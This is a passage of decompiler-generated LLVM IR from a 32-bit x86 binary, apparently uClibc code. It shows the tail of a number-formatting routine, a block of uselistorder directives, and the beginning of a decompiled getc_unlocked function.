  %v0_8055089 = phi i32 [ %v0_8055089111, %dec_label_pc_805506e ], [ %v0_8055089111, %dec_label_pc_8055067 ], [ %v0_8055089.pre, %dec_label_pc_8055072 ]
  %v1_8055089 = add i32 %v0_8055089, 1
  %v8_8055089 = icmp eq i32 %v1_8055089, 0
  store i32 %v1_8055089, i32* %ebx.global-to-local, align 4
  br i1 %v8_8055089, label %dec_label_pc_80550a3, label %dec_label_pc_805508c

dec_label_pc_805508c:                             ; preds = %dec_label_pc_8055089
  %v1_805508e = sub i32 -1, %v0_8055089
  store i32 %v1_805508e, i32* %eax.global-to-local, align 4
  %v1_8055090 = inttoptr i32 %v0_8055090 to i32*
  store i32 176, i32* %v1_8055090, align 4
  %v0_8055096 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055096 = load i32, i32* @ecx, align 4
  %v2_8055096 = add i32 %v1_8055096, 4
  %v3_8055096 = inttoptr i32 %v2_8055096 to i32*
  store i32 %v0_8055096, i32* %v3_8055096, align 4
  %v0_8055099 = load i32, i32* @ecx, align 4
  %v1_8055099 = add i32 %v0_8055099, 8
  %v2_8055099 = inttoptr i32 %v1_8055099 to i32*
  store i32 ptrtoint (i32* @global_var_8061673.785 to i32), i32* %v2_8055099, align 4
  %v0_80550a0 = load i32, i32* @ecx, align 4
  %v1_80550a0 = add i32 %v0_80550a0, 12
  store i32 %v1_80550a0, i32* @ecx, align 4
  br label %dec_label_pc_80550a3

dec_label_pc_80550a3:                             ; preds = %dec_label_pc_8055089, %dec_label_pc_805508c
  %v0_80550a7 = phi i32 [ %v0_8055090, %dec_label_pc_8055089 ], [ %v1_80550a0, %dec_label_pc_805508c ]
  %v0_80550a3 = load i32, i32* %edx.global-to-local, align 4
  %v1_80550a3 = icmp eq i32 %v0_80550a3, 0
  br i1 %v1_80550a3, label %dec_label_pc_80550b6, label %dec_label_pc_80550a7

dec_label_pc_80550a7:                             ; preds = %dec_label_pc_80550a3
  %v1_80550a7 = inttoptr i32 %v0_80550a7 to i32*
  store i32 112, i32* %v1_80550a7, align 4
  %v0_80550ad = load i32, i32* %edx.global-to-local, align 4
  %v1_80550ad = load i32, i32* @ecx, align 4
  %v2_80550ad = add i32 %v1_80550ad, 4
  %v3_80550ad = inttoptr i32 %v2_80550ad to i32*
  store i32 %v0_80550ad, i32* %v3_80550ad, align 4
  %v0_80550b0 = load i32, i32* %edi.global-to-local, align 4
  %v1_80550b0 = load i32, i32* @ecx, align 4
  %v2_80550b0 = add i32 %v1_80550b0, 8
  %v3_80550b0 = inttoptr i32 %v2_80550b0 to i32*
  store i32 %v0_80550b0, i32* %v3_80550b0, align 4
  %v0_80550b3 = load i32, i32* @ecx, align 4
  %v1_80550b3 = add i32 %v0_80550b3, 12
  store i32 %v1_80550b3, i32* @ecx, align 4
  br label %dec_label_pc_80550b6

dec_label_pc_80550b6:                             ; preds = %dec_label_pc_80550a3, %dec_label_pc_80550a7
  %v0_80550d4 = phi i32 [ %v0_80550a7, %dec_label_pc_80550a3 ], [ %v1_80550b3, %dec_label_pc_80550a7 ]
  br i1 %v1_8054ed0, label %dec_label_pc_80550ca, label %dec_label_pc_80550bd

dec_label_pc_80550bd:                             ; preds = %dec_label_pc_80550b6
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  %v3_80550c4 = load i8, i8* %v2_805505d, align 1
  %v4_80550c4 = and i8 %v3_80550c4, 16
  %v5_80550c4 = icmp eq i8 %v4_80550c4, 0
  br i1 %v5_80550c4, label %dec_label_pc_80550e7, label %dec_label_pc_80550ca

dec_label_pc_80550ca:                             ; preds = %dec_label_pc_80550bd, %dec_label_pc_80550b6
  %v0_80550ca = load i32, i32* %edx.global-to-local, align 4
  %v1_80550cc = load i32, i32* %ebx.global-to-local, align 4
  %v2_80550cc = sub i32 %v0_80550ca, %v1_80550cc
  store i32 %v2_80550cc, i32* %eax.global-to-local, align 4
  %v1_80550ce = load i32, i32* %ebp.global-to-local, align 4
  %v2_80550ce = sub i32 %v2_80550cc, %v1_80550ce
  %v8_80550ce = xor i32 %v1_80550ce, %v2_80550cc
  %v9_80550ce = xor i32 %v2_80550ce, %v2_80550cc
  %v10_80550ce = and i32 %v9_80550ce, %v8_80550ce
  %v11_80550ce = icmp slt i32 %v10_80550ce, 0
  %v13_80550ce = icmp slt i32 %v2_80550ce, 0
  %v2_80550d0 = icmp eq i1 %v13_80550ce, %v11_80550ce
  br i1 %v2_80550d0, label %dec_label_pc_80550e7, label %dec_label_pc_80550d2

dec_label_pc_80550d2:                             ; preds = %dec_label_pc_80550ca
  %v2_80550d2 = sub i32 %v1_80550ce, %v2_80550cc
  store i32 %v2_80550d2, i32* %ebp.global-to-local, align 4
  %v1_80550d4 = inttoptr i32 %v0_80550d4 to i32*
  store i32 176, i32* %v1_80550d4, align 4
  %v0_80550da = load i32, i32* %ebp.global-to-local, align 4
  %v1_80550da = load i32, i32* @ecx, align 4
  %v2_80550da = add i32 %v1_80550da, 4
  %v3_80550da = inttoptr i32 %v2_80550da to i32*
  store i32 %v0_80550da, i32* %v3_80550da, align 4
  %v0_80550dd = load i32, i32* @ecx, align 4
  %v1_80550dd = add i32 %v0_80550dd, 8
  %v2_80550dd = inttoptr i32 %v1_80550dd to i32*
  store i32 ptrtoint (i32* @global_var_8061673.785 to i32), i32* %v2_80550dd, align 4
  %v0_80550e4 = load i32, i32* @ecx, align 4
  %v1_80550e4 = add i32 %v0_80550e4, 12
  store i32 %v1_80550e4, i32* @ecx, align 4
  br label %dec_label_pc_80550e7

dec_label_pc_80550e7:                             ; preds = %dec_label_pc_80550ca, %dec_label_pc_80550bd, %dec_label_pc_80550d2
  %v1_805516f121 = phi i32 [ %v0_80550d4, %dec_label_pc_80550ca ], [ %v0_80550d4, %dec_label_pc_80550bd ], [ %v1_80550e4, %dec_label_pc_80550d2 ]
  %v12_80550e7 = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_80550e7, label %dec_label_pc_8055162, label %dec_label_pc_80550ee

dec_label_pc_80550ee:                             ; preds = %dec_label_pc_80550e7
  %v5_80550ee = load i32, i32* %edx.global-to-local, align 4
  %v6_80550ee = and i32 %v5_80550ee, -256
  %v7_80550ee = or i32 %v6_80550ee, %stack_var_-42.0
  store i32 %v7_80550ee, i32* %edx.global-to-local, align 4
  %v0_80550f5 = load i32, i32* %esi.global-to-local, align 4
  %v2_80550f5 = icmp slt i32 %v0_80550f5, 0
  %v1_80550f7 = trunc i32 %stack_var_-42.0 to i8
  br i1 %v2_80550f5, label %dec_label_pc_8055106, label %dec_label_pc_805510f

dec_label_pc_8055106:                             ; preds = %dec_label_pc_80550ee
  store i32 %v0_80550f5, i32* %edx.global-to-local, align 4
  %v1_8055108 = sub i32 0, %v0_80550f5
  br label %dec_label_pc_805510f

dec_label_pc_805510f:                             ; preds = %dec_label_pc_80550ee, %dec_label_pc_8055106
  %storemerge27 = phi i32 [ %v1_8055108, %dec_label_pc_8055106 ], [ %v0_80550f5, %dec_label_pc_80550ee ]
  %storemerge9 = phi i8 [ 45, %dec_label_pc_8055106 ], [ 43, %dec_label_pc_80550ee ]
  store i32 %storemerge27, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-27, align 4
  %v2_8055117 = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_8055117, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8055123

dec_label_pc_8055123:                             ; preds = %dec_label_pc_8055123.backedge, %dec_label_pc_805510f
  %v0_805512e = phi i32 [ %v0_805512e.pre, %dec_label_pc_8055123.backedge ], [ %v2_8055117, %dec_label_pc_805510f ]
  %v0_805512b = phi i32 [ %v0_805512b.pre, %dec_label_pc_8055123.backedge ], [ 2, %dec_label_pc_805510f ]
  %v0_8055123 = phi i32 [ %v9_805512c, %dec_label_pc_8055123.backedge ], [ %storemerge27, %dec_label_pc_805510f ]
  %v1_805512a = ashr i32 %v0_8055123, 31
  %v1_805512b = add i32 %v0_805512b, 1
  store i32 %v1_805512b, i32* %edi.global-to-local, align 4
  %v2_805512c = zext i32 %v0_8055123 to i64
  %v4_805512c = zext i32 %v1_805512a to i64
  %v5_805512c = mul nuw i64 %v4_805512c, 4294967296
  %v6_805512c = or i64 %v5_805512c, %v2_805512c
  %v8_805512c = sdiv i64 %v6_805512c, 10
  %v9_805512c = trunc i64 %v8_805512c to i32
  %v10_805512c = srem i64 %v6_805512c, 10
  %v1_805512e = add i32 %v0_805512e, -1
  store i32 %v1_805512e, i32* %ebx.global-to-local, align 4
  store i32 %v9_805512c, i32* %esi.global-to-local, align 4
  %v3_8055131 = and i32 %v9_805512c, -256
  %v1_8055133 = trunc i64 %v10_805512c to i8
  %v2_8055133 = add i8 %v1_8055133, 48
  %v12_8055133 = zext i8 %v2_8055133 to i32
  %v15_8055133 = or i32 %v12_8055133, %v3_8055131
  store i32 %v15_8055133, i32* %eax.global-to-local, align 4
  %v3_8055138 = inttoptr i32 %v1_805512e to i8*
  store i8 %v2_8055133, i8* %v3_8055138, align 1
  store i32 %v9_805512c, i32* %edx.global-to-local, align 4
  %v7_805513c = icmp sgt i32 %v1_805512b, 3
  br i1 %v7_805513c, label %dec_label_pc_805513e, label %dec_label_pc_8055123.backedge

dec_label_pc_805513e:                             ; preds = %dec_label_pc_8055123
  %v2_805513e = icmp eq i32 %v9_805512c, 0
  %v1_8055140 = icmp eq i1 %v2_805513e, false
  br i1 %v1_8055140, label %dec_label_pc_8055123.backedge, label %dec_label_pc_8055142

dec_label_pc_8055123.backedge:                    ; preds = %dec_label_pc_805513e, %dec_label_pc_8055123
  %v0_805512b.pre = load i32, i32* %edi.global-to-local, align 4
  %v0_805512e.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055123

dec_label_pc_8055142:                             ; preds = %dec_label_pc_805513e
  %v4_8055142 = zext i8 %storemerge9 to i32
  %v7_8055142 = or i32 %v3_8055131, %v4_8055142
  store i32 %v7_8055142, i32* %edx.global-to-local, align 4
  %v0_8055146 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055146 = add i32 %v0_8055146, -2
  store i32 %v1_8055146, i32* %eax.global-to-local, align 4
  %v3_8055149 = add i32 %v0_8055146, -1
  %v4_8055149 = inttoptr i32 %v3_8055149 to i8*
  store i8 %storemerge9, i8* %v4_8055149, align 1
  %v5_805514c = load i32, i32* %edx.global-to-local, align 4
  %v6_805514c = and i32 %v5_805514c, -256
  %v7_805514c = or i32 %v6_805514c, %stack_var_-42.0
  store i32 %v7_805514c, i32* %edx.global-to-local, align 4
  %v2_8055150 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8055150 = add i32 %v2_8055150, -2
  %v4_8055150 = inttoptr i32 %v3_8055150 to i8*
  store i8 %v1_80550f7, i8* %v4_8055150, align 1
  %v0_8055153 = load i32, i32* @ecx, align 4
  %v1_8055153 = inttoptr i32 %v0_8055153 to i32*
  store i32 112, i32* %v1_8055153, align 4
  %v0_8055159 = load i32, i32* %edi.global-to-local, align 4
  %v1_8055159 = load i32, i32* @ecx, align 4
  %v2_8055159 = add i32 %v1_8055159, 4
  %v3_8055159 = inttoptr i32 %v2_8055159 to i32*
  store i32 %v0_8055159, i32* %v3_8055159, align 4
  %v0_805515c = load i32, i32* %eax.global-to-local, align 4
  %v1_805515c = load i32, i32* @ecx, align 4
  %v2_805515c = add i32 %v1_805515c, 8
  %v3_805515c = inttoptr i32 %v2_805515c to i32*
  store i32 %v0_805515c, i32* %v3_805515c, align 4
  %v0_805515f = load i32, i32* @ecx, align 4
  %v1_805515f = add i32 %v0_805515f, 12
  store i32 %v1_805515f, i32* @ecx, align 4
  br label %dec_label_pc_8055162

dec_label_pc_8055162:                             ; preds = %dec_label_pc_80550e7, %dec_label_pc_8054d91, %dec_label_pc_8055142
  %v0_80551e1 = phi i32 [ %v1_805516f121, %dec_label_pc_80550e7 ], [ %v2_8054d99, %dec_label_pc_8054d91 ], [ %v1_805515f, %dec_label_pc_8055142 ]
  %v2_8055162 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8055162, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055166

dec_label_pc_8055166:                             ; preds = %dec_label_pc_8055166, %dec_label_pc_8055162
  %v0_8055166 = phi i32 [ %v2_8055162, %dec_label_pc_8055162 ], [ %v1_8055168, %dec_label_pc_8055166 ]
  %stack_var_-216.0 = phi i32 [ %v3_8054c93, %dec_label_pc_8055162 ], [ %v5_805516b, %dec_label_pc_8055166 ]
  %v1_8055166 = inttoptr i32 %v0_8055166 to i32*
  %v2_8055166 = load i32, i32* %v1_8055166, align 4
  store i32 %v2_8055166, i32* %ebx.global-to-local, align 4
  %v1_8055168 = add i32 %v0_8055166, 12
  store i32 %v1_8055168, i32* %eax.global-to-local, align 4
  %v5_805516b = sub i32 %stack_var_-216.0, %v2_8055166
  %v7_805516f = icmp ult i32 %v1_8055168, %v0_80551e1
  br i1 %v7_805516f, label %dec_label_pc_8055166, label %dec_label_pc_8055173

dec_label_pc_8055173:                             ; preds = %dec_label_pc_8055166
  store i32 %v0_80551e1, i32* %esi.global-to-local, align 4
  %v5_8055186 = icmp eq i8 %stack_var_-26.0, 0
  store i32 160, i32* %stack_var_-168, align 4
  %v1_8055196 = icmp eq i1 %v5_8055186, false
  %v2_8055196 = zext i1 %v1_8055196 to i32
  store i32 %v2_8055196, i32* %edx.global-to-local, align 4
  %v2_8055199 = sub i32 %v5_805516b, %v2_8055196
  store i32 %v2_8055199, i32* %eax.global-to-local, align 4
  %tmp190 = icmp slt i32 %v2_8055199, 1
  br i1 %tmp190, label %dec_label_pc_80551e3, label %dec_label_pc_80551a3

dec_label_pc_80551a3:                             ; preds = %dec_label_pc_8055173
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v2_80551aa = inttoptr i32 %v1_8054cd3 to i8*
  %v3_80551aa = load i8, i8* %v2_80551aa, align 1
  %v4_80551aa = and i8 %v3_80551aa, 8
  %v5_80551aa = icmp eq i8 %v4_80551aa, 0
  br i1 %v5_80551aa, label %dec_label_pc_80551c5, label %dec_label_pc_80551b0

dec_label_pc_80551b0:                             ; preds = %dec_label_pc_80551a3
  %v1_80551b0 = add i32 %v0_80551e1, 12
  store i32 %v1_80551b0, i32* %esi.global-to-local, align 4
  %v1_80551b3 = inttoptr i32 %v0_80551e1 to i32*
  store i32 160, i32* %v1_80551b3, align 4
  %v1_80551b9 = load i32, i32* @ecx, align 4
  %v2_80551b9 = add i32 %v1_80551b9, 4
  %v3_80551b9 = inttoptr i32 %v2_80551b9 to i32*
  store i32 %v2_8055199, i32* %v3_80551b9, align 4
  %v0_80551bc = load i32, i32* @ecx, align 4
  %v1_80551bc = add i32 %v0_80551bc, 8
  %v2_80551bc = inttoptr i32 %v1_80551bc to i32*
  store i32 ptrtoint (i32* @global_var_8061673.785 to i32), i32* %v2_80551bc, align 4
  br label %dec_label_pc_80551e3

dec_label_pc_80551c5:                             ; preds = %dec_label_pc_80551a3
  store i32 %tmp156, i32* %ebx.global-to-local, align 4
  %v1_80551cc = add i32 %tmp156, 16
  %v2_80551cc = inttoptr i32 %v1_80551cc to i32*
  %v3_80551cc = load i32, i32* %v2_80551cc, align 4
  %v9_80551cc = icmp eq i32 %v3_80551cc, 48
  %v1_80551d0 = icmp eq i1 %v9_80551cc, false
  br i1 %v1_80551d0, label %dec_label_pc_80551dd, label %dec_label_pc_80551d2

dec_label_pc_80551d2:                             ; preds = %dec_label_pc_80551c5
  %v3_80551d2 = load i32, i32* %stack_var_-152, align 4
  %v5_80551d2 = add i32 %v3_80551d2, %v2_8055199
  store i32 %v5_80551d2, i32* %stack_var_-152, align 4
  br label %dec_label_pc_80551e1

dec_label_pc_80551d8:                             ; preds = %dec_label_pc_80551e9
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8055210

dec_label_pc_80551dd:                             ; preds = %dec_label_pc_80551c5
  br label %dec_label_pc_80551e1

dec_label_pc_80551e1:                             ; preds = %dec_label_pc_80551d2, %dec_label_pc_80551dd
  store i32 %v0_80551e1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80551e3

dec_label_pc_80551e3:                             ; preds = %dec_label_pc_8055173, %dec_label_pc_80551b0, %dec_label_pc_80551e1
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_80551e5 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_80551e5, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80551e9

dec_label_pc_80551e9:                             ; preds = %dec_label_pc_8055207, %dec_label_pc_80551e3
  call void @__pseudo_call(i32 %tmp156)
  %v1_8055202 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8055202 = add i32 %v1_8055202, 4
  %v3_8055202 = inttoptr i32 %v2_8055202 to i32*
  %v4_8055202 = load i32, i32* %v3_8055202, align 4
  %v15_8055202 = icmp eq i32 %v2_8055199, %v4_8055202
  %v1_8055205 = icmp eq i1 %v15_8055202, false
  br i1 %v1_8055205, label %dec_label_pc_80551d8, label %dec_label_pc_8055207

dec_label_pc_8055207:                             ; preds = %dec_label_pc_80551e9
  %v1_8055207 = add i32 %v1_8055202, 12
  store i32 %v1_8055207, i32* %ebx.global-to-local, align 4
  %v0_805520a = load i32, i32* %edi.global-to-local, align 4
  %v2_805520a = add i32 %v0_805520a, %v2_8055199
  store i32 %v2_805520a, i32* %edi.global-to-local, align 4
  %v1_805520c = load i32, i32* %esi.global-to-local, align 4
  %v7_805520c = icmp ult i32 %v1_8055207, %v1_805520c
  br i1 %v7_805520c, label %dec_label_pc_80551e9, label %dec_label_pc_8055210

dec_label_pc_8055210:                             ; preds = %dec_label_pc_8055207, %dec_label_pc_80551d8
  %v0_8055216 = phi i32 [ -1, %dec_label_pc_80551d8 ], [ %v2_805520a, %dec_label_pc_8055207 ]
  store i32 %v0_8055216, i32* %eax.global-to-local, align 4
  %v2_8055219 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8055219, i32* @esi, align 4
  store i32 %v0_8054c76, i32* @edi, align 4
  store i32 %v0_8054c75, i32* @ebp, align 4
  ret i32 %v0_8055216

; uselistorder directives
  uselistorder i32 %v0_8055216, { 1, 0 }
  uselistorder i32 %v2_8055199, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v2_8055196, { 1, 0 }
  uselistorder i32 %v1_8055168, { 1, 2, 0 }
  uselistorder i32 %v0_8055166, { 1, 0 }
  uselistorder i32 %v0_80551e1, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v9_805512c, { 3, 2, 1, 0, 4 }
  uselistorder i8 %storemerge9, { 1, 0 }
  uselistorder i32 %v0_80550f5, { 2, 1, 0, 3 }
  uselistorder i32 %v2_80550ce, { 1, 0 }
  uselistorder i32 %v1_80550ce, { 1, 0, 2 }
  uselistorder i32 %v2_80550cc, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_8055089, { 1, 0 }
  uselistorder i32 %v2_8054ff6, { 2, 1, 3, 0 }
  uselistorder i32 %v2_8054ff0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_805504d, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v1_8054f8c, { 1, 0 }
  uselistorder i32 %v0_8054f87, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8054f54, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_8054f4f, { 1, 0 }
  uselistorder i8 %v2_8054f48, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_8054f48, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-220.3, { 1, 0 }
  uselistorder i32 %v0_8054ed2, { 1, 2, 0 }
  uselistorder i32 %stack_var_-42.0, { 0, 2, 1 }
  uselistorder i8 %stack_var_-207.1, { 4, 3, 1, 5, 0, 2 }
  uselistorder i8 %v4_8054eb7, { 1, 0 }
  uselistorder i32 %tmp195, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_8054e82, { 1, 0 }
  uselistorder i32 %v2_8054e3b, { 2, 1, 0 }
  uselistorder i32 %v0_8054ef1, { 1, 2, 0, 3 }
  uselistorder x86_fp80 %v1_8054e0d, { 1, 0 }
  uselistorder x86_fp80 %v3_8054def, { 2, 0, 1, 3, 6, 7, 5, 8, 4, 9, 10 }
  uselistorder i32 %v3_8054dec, { 1, 0 }
  uselistorder x86_fp80 %v4_8054dd4, { 2, 0, 1, 3, 4 }
  uselistorder x86_fp80 %v3_8054dce, { 1, 2, 0 }
  uselistorder i32 %v3_8054dcb, { 1, 0 }
  uselistorder i32 %v1_8054dc4, { 3, 0, 1, 2 }
  uselistorder i32 %stack_var_-220.0, { 2, 0, 1 }
  uselistorder x86_fp80 %v1_8054dfd, { 8, 1, 2, 5, 3, 4, 6, 0, 7, 9 }
  uselistorder x86_fp80 %v2_8054dc5, { 1, 0 }
  uselistorder i8 %v4_8054d75, { 1, 0 }
  uselistorder i3 %v1_8054d12, { 1, 0, 2 }
  uselistorder i8 %stack_var_-207.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
  uselistorder i8 %v3_8054c9a, { 1, 0, 2, 3 }
  uselistorder i32 %v3_8054c93, { 1, 0, 2 }
  uselistorder i3 %v4_8054c8c, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp156, { 14, 13, 12, 11, 10, 9, 8, 7, 0, 6, 1, 2, 3, 5, 4 }
  uselistorder x86_fp80 %tmp155, { 3, 2, 1, 0, 4, 5 }
  uselistorder x86_fp80* %st1.global-to-local, { 3, 2, 4, 9, 12, 5, 7, 8, 6, 10, 1, 11, 0 }
  uselistorder x86_fp80* %st0.global-to-local, { 2, 7, 8, 1, 3, 4, 6, 0, 5 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 5, 4, 6, 7, 8, 1, 9, 10, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 2, 0, 1, 3, 4, 6, 8, 7, 5, 9, 10, 11, 12 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 27, 6, 7, 10, 12, 11, 13, 8, 9, 14, 17, 15, 18, 16, 19, 20, 21, 22, 23, 28, 24, 25, 26 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 9, 8, 10 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 26, 12, 13, 27, 14, 15, 16, 17, 21, 22, 18, 19, 20, 23, 24, 25, 28, 29 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 4, 5, 2, 6, 8, 3, 7, 9, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 2, 3, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i8 43, { 2, 1, 0 }
  uselistorder i8 45, { 2, 3, 1, 0, 4 }
  uselistorder i32 21, { 1, 2, 0 }
  uselistorder i8 102, { 2, 3, 1, 0 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder i32 69, { 1, 2, 0 }
  uselistorder x86_fp80 0xK401CEE6B280000000000, { 1, 2, 0 }
  uselistorder i32 4096, { 4, 21, 5, 23, 6, 22, 10, 19, 20, 7, 8, 11, 13, 12, 1, 14, 16, 15, 2, 18, 17, 3, 0, 9 }
  uselistorder i32 13, { 1, 6, 5, 2, 3, 4, 0 }
  uselistorder x86_fp80 0xK3FFD8000000000000000, { 1, 0, 2, 3 }
  uselistorder x86_fp80 0xK00000000000000000000, { 0, 2, 3, 4, 1 }
  uselistorder i8 6, { 1, 0 }
  uselistorder label %dec_label_pc_80551e3, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80551e1, { 1, 0 }
  uselistorder label %dec_label_pc_8055162, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805510f, { 1, 0 }
  uselistorder label %dec_label_pc_80550e7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80550b6, { 1, 0 }
  uselistorder label %dec_label_pc_80550a3, { 1, 0 }
  uselistorder label %dec_label_pc_8055089, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055056, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055041, { 1, 0 }
  uselistorder label %dec_label_pc_8055036, { 1, 0 }
  uselistorder label %dec_label_pc_8054fbd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054faf, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054f75, { 1, 0 }
  uselistorder label %dec_label_pc_8054f45.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_8054f11, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054ee0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8054ecb, { 1, 0 }
  uselistorder label %dec_label_pc_8054e37, { 1, 0 }
  uselistorder label %dec_label_pc_8054e0f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054e0d, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054dfd, { 1, 0 }
  uselistorder label %dec_label_pc_8054d91, { 1, 0 }
  uselistorder label %dec_label_pc_8054cba, { 1, 0 }
}

define i32 @getc_unlocked() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16* @__decompiler_undefined_function_6()
  %stack_var_-5 = alloca i8, align 1
  %v0_8055220 = load i32, i32* @ebx, align 4
  %v4_8055224 = ptrtoint i16* %tmp to i32
  store i32 %v4_8055224, i32* @ebx, align 4
  %v1_8055228 = add i32 %v4_8055224, 16
  %v2_8055228 = inttoptr i32 %v1_8055228 to i32*
  %v3_8055228 = load i32, i32* %v2_8055228, align 4
  %v2_805522b = add i32 %v4_8055224, 24
  %v3_805522b = inttoptr i32 %v2_805522b to i32*
  %v4_805522b = load i32, i32* %v3_805522b, align 4
  %v10_805522b = icmp ult i32 %v3_8055228, %v4_805522b
  br i1 %v10_805522b, label %dec_label_pc_80552cd, label %dec_label_pc_8055234

dec_label_pc_8055234:                             ; preds = %entry
  %v2_8055234 = load i16, i16* %tmp, align 2
  %v3_8055234 = zext i16 %v2_8055234 to i32
  %v1_8055237 = and i32 %v3_8055234, 131
  %v6_8055241 = icmp ugt i32 %v1_8055237, 128
  br i1 %v6_8055241, label %dec_label_pc_805525b, label %dec_label_pc_8055243

dec_label_pc_8055243:                             ; preds = %dec_label_pc_8055234
  %v0_8055243 = load i32, i32* @edx, align 4
  %v6_805524b = call i32 @__stdio_trans2r_o(i16* nonnull %tmp, i32 128, i32 %v0_8055243, i32 %v0_8055243)
  %v1_8055253 = icmp eq i32 %v6_805524b, 0
  %v1_8055255 = icmp eq i1 %v1_8055253, false
  br i1 %v1_8055255, label %dec_label_pc_80552f2, label %dec_label_pc_8055243.dec_label_pc_805525b_crit_edge

dec_label_pc_8055243.dec_label_pc_805525b_crit_edge: ; preds = %dec_label_pc_8055243
  %v0_805525b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805525b

dec_label_pc_805525b:                             ; preds = %dec_label_pc_8055243.dec_label_pc_805525b_crit_edge, %dec_label_pc_8055234
  %v2_805528f = phi i32 [ %v0_805525b.pre, %dec_label_pc_8055243.dec_label_pc_805525b_crit_edge ], [ %v4_8055224, %dec_label_pc_8055234 ]
  %v1_805525b = inttoptr i32 %v2_805528f to i16*
  %v2_805525b = load i16, i16* %v1_805525b, align 2
  %v3_805525b = zext i16 %v2_805525b to i32
  store i32 %v3_805525b, i32* @ecx, align 4
  %v2_805525e = and i16 %v2_805525b, 2
  %v3_805525e = icmp eq i16 %v2_805525e, 0
  br i1 %v3_805525e, label %dec_label_pc_805527e, label %dec_label_pc_8055263

dec_label_pc_8055263:                             ; preds = %dec_label_pc_805525b
  %tmp20 = urem i16 %v2_805525b, 2
  %v1_8055265 = zext i16 %tmp20 to i32
  %tmp19 = sub nsw i32 0, %v1_8055265
  %v2_8055268 = and i32 %tmp19, 4
  %v3_8055268 = add i32 %v2_805528f, 36
  %v4_8055268 = add i32 %v3_8055268, %v2_8055268
  %v5_8055268 = inttoptr i32 %v4_8055268 to i8*
  %v6_8055268 = load i8, i8* %v5_8055268, align 1
  %v7_8055268 = zext i8 %v6_8055268 to i32
  %v8_8055268 = load i32, i32* @edx, align 4
  %v9_8055268 = and i32 %v8_8055268, -256
  %v10_8055268 = or i32 %v9_8055268, %v7_8055268
  store i32 %v10_8055268, i32* %edx.global-to-local, align 4
  %v1_805526c = add i16 %v2_805525b, -1
  store i16 %v1_805526c, i16* %v1_805525b, align 2
  %v0_8055272 = load i32, i32* @ebx, align 4
  %v1_8055272 = add i32 %v0_8055272, 40
  %v2_8055272 = inttoptr i32 %v1_8055272 to i32*
  store i32 0, i32* %v2_8055272, align 4
  %v0_8055279 = load i32, i32* %edx.global-to-local, align 4
  %v1_8055279 = urem i32 %v0_8055279, 256
  store i32 %v1_8055279, i32* @edx, align 4
  br label %dec_label_pc_80552f5

dec_label_pc_805527e:                             ; preds = %dec_label_pc_805525b
  %v1_805527e = add i32 %v2_805528f, 16
  %v2_805527e = inttoptr i32 %v1_805527e to i32*
  %v3_805527e = load i32, i32* %v2_805527e, align 4
  store i32 %v3_805527e, i32* @eax, align 4
  %v1_8055281 = add i32 %v2_805528f, 20
